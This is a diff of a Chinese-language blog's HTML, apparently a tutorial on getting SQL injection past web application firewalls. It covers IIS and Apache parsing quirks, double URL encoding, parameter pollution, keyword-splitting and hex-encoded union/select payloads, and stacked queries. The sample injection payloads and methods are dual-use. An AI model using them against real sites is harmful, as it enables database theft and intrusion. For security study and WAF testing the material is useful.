@@ -247,7 +247,10 @@
 
       
         
-          <span itemprop="articleBody"><h2 id="Web_Server层的bypass">Web Server层的bypass</h2><p>1.IIS服务器</p>
+          <span itemprop="articleBody"><blockquote>
+<p>心得：waf存在于一个完整请求的各个部分，云waf，硬waf，软waf。现阶段可以理解为：我们请求的所有数据，都经过waf，由waf进行识别是否为合法请求。<strong>bypass的姿势就是要利用不同场景的特性构造一个不能被waf识别的有效请求</strong>，这个请求可能起作用于Web server\web程序\数据库等不同的地方。<strong>但是万变不离其中，本质就是寻找waf环境和系统环境间相同语句的不同解析结果</strong></p>
+</blockquote>
+<h2 id="Web_Server层的bypass">Web Server层的bypass</h2><p>1.IIS服务器</p>
 <ul>
 <li><p>% 特性<br>场景：iis+asp<br>说明：字符串se%lect在waf层解析出来是se%lect在asp+iis环境中是select</p>
 </li>
@@ -261,7 +264,7 @@
 <ul>
 <li><p>method绕过<br>场景：某些版本的Apache<br>说明：发生GET请求时，无论method取任何值，都返回200.<br>具体参考<br><a href="http://www.wooyun.org/bugs/wooyun-2013-024599" target="_blank" rel="external">安全宝SQL注入规则绕过</a></p>
 </li>
-<li><p>php和Apache畸形boundary绕过<br>场景：php+Apache<br>说明：Php在解析multipart-data的时候有自己的特性，对于boundary的识别，只取了逗号前面的内容，例如我们设置的boundary为—-aaaa,123456，php解析的时候只识别了—-aaaa,后面的内容均没有识别。然而其他的如WAF在做解析的时候，有可能获取的是整个字符串，此时可能就会出现BYPASS。</p>
+<li><p>php和Apache畸形boundary绕过<br>场景：php+Apach<br>说明：Php在解析multipart-data的时候有自己的特性，对于boundary的识别，只取了逗号前面的内容，例如我们设置的boundary为—-aaaa,123456，php解析的时候只识别了—-aaaa,后面的内容均没有识别。然而其他的如WAF在做解析的时候，有可能获取的是整个字符串，此时可能就会出现BYPASS。</p>
 </li>
 </ul>
 <h2 id="Web应用程序层bypass">Web应用程序层bypass</h2><p>1.url编码绕过<br>说明：在这一步waf可能会对url只进行一次解码，然后过滤。此时可以试<strong>一次url编码</strong>或<strong>两次url编码</strong>，不管怎么样在应用程序里，都需要对url进行完全解码，就是解到正常的语句，要不然还是无法继续执行的。<br>具体参考：<br><a href="http://www.wooyun.org/bugs/wooyun-2015-090369" target="_blank" rel="external">两次url编码绕过waf</a><br>2.改变请求获取方式</p>
@@ -277,6 +280,10 @@
 <pre><code>asp/asp.net + iss : id = <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>
 php+apache : id = <span class="number">3</span>
 </code></pre><p>由此可见，waf获取的参数和应用程序获取到的参数也可能是不一样，具体情境具体分析，要搞清楚waf获取到的内容和应用获取到的内容的差异，才能准确构造payload。<br>这种方式的bypass可能进行一些白名单的绕过<br><code>id = admin&amp;id = 1union select user from admin</code><br>admin是白名单中的内容，后面id内容是应用获取到的内容。这种情况就可能发生注入。<br>具体参考<br><a href="http://www.wooyun.org/bugs/wooyun-2015-099513" target="_blank" rel="external">使用webscan360的cms厂商通过hpp可使其失效</a></p>
+<h2 id="Mysql数据库层Bypass">Mysql数据库层Bypass</h2><blockquote>
+<p>通常注入语句的构造是从形如?id=1之后开始构造的，所以从参数之后的位置开始。</p>
+</blockquote>
+<p>union绕过：<br><a href="http://zone.wooyun.org/content/16772" target="_blank" rel="external">union绕过的三种姿势</a></p>
 </span>
         
       
@@ -740,6 +747,21 @@ php+apache : id = <span class="number">3</span>
         </span>
 
         
+          <span class="post-category" >
+            &nbsp; | &nbsp; 分类于
+            
+              <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                <a href="/categories/SLQ注入练级系列/" itemprop="url" rel="index">
+                  <span itemprop="name">SLQ注入练级系列</span>
+                </a>
+              </span>
+
+              
+              
+
+            
+          </span>
+        
 
         
           
@@ -767,9 +789,6 @@ php+apache : id = <span class="number">3</span>
 <pre><code>page.php?id =<span class="number">1</span> UNIunionON SELselectECT <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> ;
 </code></pre><p>也可以构造的更复杂视情况而定SeLSeselectleCTecT</p>
 <h2 id="使用编码">使用编码</h2><ul>
-<li><p>URL编码<br>普通的URL编码可能无法实现绕过不过存在某种情况URL编码只进行了一次解码过滤可以用两次编码绕过</p>
-<p>  page.php?id=1%252f%252a*/UNION%252f%252a/SELECT </p>
-</li>
 <li><p>Hex编码</p>
 <p>  z.com/index.php?page_id=-15 /<em>!u%6eion</em>/ /<em>!se%6cect</em>/ 1,2,3,4,SELECT(extractvalue(0x3C613E61646D696E3C2F613E,0x2f61))<br>  //6e-&gt;n   6c-&gt;l  字母的十六进制编码，与ascii码一致，在python解释器中<br>  //python&gt; “admin”.encode(“hex”) #61646D696E<br>  //python&gt; “61646D696E”.decode(“hex”) #admin</p>
 </li>
@@ -1327,10 +1346,10 @@ mysql&gt; select <span class="keyword">user</span> <span class="keyword">from</s
 <h2 id="联合查询注入">联合查询注入</h2><p>绕过了union和select基本就可以干所有的事情了<br>1.最基本的查询其他内容    </p>
 <pre><code>mysql&gt; <span class="keyword">select</span> id <span class="keyword">from</span> admin2 <span class="built_in">union</span> <span class="built_in">all</span> <span class="keyword">select</span> username <span class="keyword">from</span> admin;
 </code></pre><p>2.猜解字段数：</p>
-<pre><code>mysql&gt; select <span class="number">1</span> <span class="keyword">union</span> select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5.</span>..from admin;
+<pre><code>mysql&gt; select * from admin where id = <span class="number">1</span> <span class="keyword">union</span> select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5.</span>..from admin;
 <span class="comment">//知道返回正常就说明有几个字段</span>
 </code></pre><p>3.猜解字段</p>
-<pre><code>mysql&gt; select <span class="number">1</span> <span class="keyword">union</span> select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,username,<span class="number">5.</span>..from admin
+<pre><code>mysql&gt; select * from admin where id = <span class="number">1</span> <span class="keyword">union</span> select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,username,<span class="number">5.</span>..from admin
 <span class="comment">//猜解username字段是否存在</span>
 </code></pre><h2 id="堆查询注入">堆查询注入</h2><p>PHP使用PDO_MYSQL来连接数据库，便可以使用堆查询，堆查询可以同时执行多个语句。</p>
 <pre><code>mysql&gt; <span class="keyword">select</span> @@version;<span class="function"><span class="keyword">select</span> <span class="title">database</span>(<span class="params"></span>)</span>;
